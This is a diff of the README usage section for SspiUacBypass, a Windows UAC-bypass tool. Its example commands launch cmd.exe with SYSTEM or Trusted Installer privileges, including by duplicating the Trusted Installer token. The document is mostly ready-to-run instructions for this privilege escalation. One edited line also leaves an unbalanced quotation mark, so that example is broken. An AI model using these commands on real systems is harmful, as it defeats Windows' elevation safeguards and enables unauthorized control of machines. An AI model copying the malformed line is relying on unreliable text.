@@ -17,9 +17,9 @@ Run a command using SYSTEM privileges
 **Note**: By default, as the program will be executed by a service, it will spawn on Session 0 which is isolated from your current session.
 
 ```
-SspiUacBypass.exe  c:\windows\system32\cmd.exe
-SspiUacBypass.exe  cmd.exe
-SspiUacBypass.exe  "cmd.exe /k dir %windir%\System32"
+SspiUacBypass.exe c:\windows\system32\cmd.exe
+SspiUacBypass.exe cmd.exe
+SspiUacBypass.exe cmd.exe /k dir %windir%\System32"
 ```
 
 Run a command using SYSTEM privileges **(Interactive)**
@@ -27,7 +27,7 @@ Run a command using SYSTEM privileges **(Interactive)**
 **Note**: Using the *-i* argument, the process will spawn on your current Session and Desktop *(winsta0\\default)*
 
 ```
-SspiUacBypass.exe  -i c:\windows\system32\cmd.exe
+SspiUacBypass.exe -i c:\windows\system32\cmd.exe
 ```
 
 Run a command using Trusted Installer Privileges
@@ -35,7 +35,7 @@ Run a command using Trusted Installer Privileges
 **Note**: Using the *-t* argument, *SspiUacBypass.exe* will try to start the **Trusted Installer service**, get its token, duplicate it and use it to spawn the process using the same privileges as *Trusted Installer*.
 
 ```
-SspiUacBypass.exe  -t c:\windows\system32\cmd.exe
+SspiUacBypass.exe -t c:\windows\system32\cmd.exe
 ```
 
 
@@ -44,5 +44,5 @@ Run a command using Trusted Installer Privileges **(Interactive)**
 **Note**: You can use both arguments at the same time. The process will spawn in the current user desktop with *Trusted Installer* privileges.
 
 ```
-SspiUacBypass.exe  -i -t c:\windows\system32\cmd.exe
+SspiUacBypass.exe -i -t c:\windows\system32\cmd.exe
 ```
